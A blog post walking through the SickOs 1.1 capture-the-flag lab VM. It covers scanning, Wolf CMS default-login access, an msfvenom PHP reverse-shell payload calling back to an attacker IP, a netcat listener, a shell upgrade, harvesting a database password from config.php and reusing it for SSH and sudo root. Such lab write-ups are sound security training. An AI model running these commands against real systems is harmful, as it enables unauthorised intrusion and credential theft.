---
layout: post
title:  CTF_SickOs
date:   2022-01-08 18:15:52 -0600
categories: CTF
tags: Linux
---

# Discovery

[https://www.vulnhub.com/entry/sickos-11,132/]

## Description
This CTF gives a clear analogy how hacking strategies can be performed on a network to compromise it in a safe environment. 
This vm is very similar to labs I faced in OSCP. 
The objective being to compromise the network/machine and gain Administrative/root privileges on them.

Objective...: Get /root/a0216ea4d51874464078c618298b1367.txt

# Scanning

## netdiscover

sudo netdiscover

![](https://i.imgur.com/yo8M1tX.png)


## nmap

![](https://i.imgur.com/EjsxJkm.png)


# Exploit
http-proxy Squid http proxy 3.1.19

[https://www.exploit-db.com/exploits/9951]
Let's use Metasploit.
```zsh
sudo msfconsole
search squid
```
![](https://i.imgur.com/w2MXcME.png)
#### Use the proxy
I dont set the proxy in my browser because I want to try the dirbuster.
```zsh
export http_proxy='http://192.168.0.26:3128'
curl http://192.168.0.26   
```
#### gobuster

```zsh
gobuster dir -x * -u http://192.168.0.26 -w Documents/wordlist/directory-list-2.3-medium.txt 
``` 
![](https://i.imgur.com/ZGAblDU.png)
/index                (Status: 200) [Size: 21]
/connect              (Status: 200) [Size: 109]
/robots               (Status: 200) [Size: 45] 
/server-status        (Status: 403) [Size: 293]

connect is a python file
```python
  1 #!/usr/bin/python
  2 
  3 print "I Try to connect things very frequently\n"
  4 print "You may want to try my services"
``` 
I don't know what to do with it.

In robots.txt
```
User-agent: *
Disallow: /
Dissalow: /wolfcms
```
Let's see what is wolfcms and see if we can exploit it.
![](https://i.imgur.com/zGLfr3c.png)
https://www.exploit-db.com/exploits/38000
```
http://192.168.0.26/wolfcms/?/admin/plugin/file_manager/browse/
```
Now we have a login page, let's try with admin/admin.
![](https://i.kym-cdn.com/photos/images/facebook/001/379/666/feb.jpg)
![](https://i.imgur.com/4Tgdowv.png)

## metasploit
I'm gonna upload a revers shell, usualy I use thoses from pentestmonkey with netcat, but this time I'm gonna use metasploit.
```zsh
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.21 LPORT=4444 -f raw -o shell.php
```
And upload the shell.php in the website.

Run msfconsole to start the listener:

```zsh
use exploit/multi/handler 
set LHOST <$LOCAL_IP>
set LPORT <$LOCAL_PORT>
set PAYLOAD php/meterpreter/reverse_tcp 
exploit
```
![](https://i.imgur.com/hQGt9Ad.png)
![](https://i.imgur.com/CEY9ICE.png)
I don't know where is my error, I just want a shell so bye bye metasploit.
## Reverse shell

I'm gonna download the reverse shell from pentestmonkey.
[https://github.com/pentestmonkey/php-reverse-shell]
And change the values.
![](https://i.imgur.com/SDx3wz7.png)
you can also replace the shell.
[https://netsec.ws/?p=337]

Upload the shell and listen with netcat.
```zsh
netcat -nlvp 4444
```
![](https://i.imgur.com/xyldqe4.png)

let's upgrade the shell with this.
```zsh
python -c 'import pty; pty.spawn("/bin/bash")'
```
# Recon 
Let's upload the LinEnum script and run it.
![](https://i.imgur.com/gtZDQ0a.png)
I want to create a txt file because it's hard to read.
![](https://i.imgur.com/Upnc7Ed.png) 
It's too hard to read I'm gonna find something else.
[https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh]
I like this one, there is lot of colors.
I think I foud it.
![](https://i.imgur.com/PLiZAJV.png)
We can edit connect.py to open a revershell with an another port,
and listen with netcat
It's not working, let's see more informations.
![](https://i.imgur.com/qnNZ3ve.png)
Ok this file is not for now, I think I have to find the user first, not the root.

```zsh
cat /var/www/wolfcms/config.php

// Database settings:
define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
define('DB_USER', 'root');
define('DB_PASS', 'john@123');
define('TABLE_PREFIX', '');
```
The user is not working for root, but for sickos it's good.
```zsh
ssh sickos@192.168.0.26
john@123
```

Now I'm gonna run the enumeration script with the user sickOS

![](https://i.imgur.com/nM0aAHv.png)
```zsh
sudo su
```

I'm root.
![](https://i.imgur.com/tdk9zei.png)

)






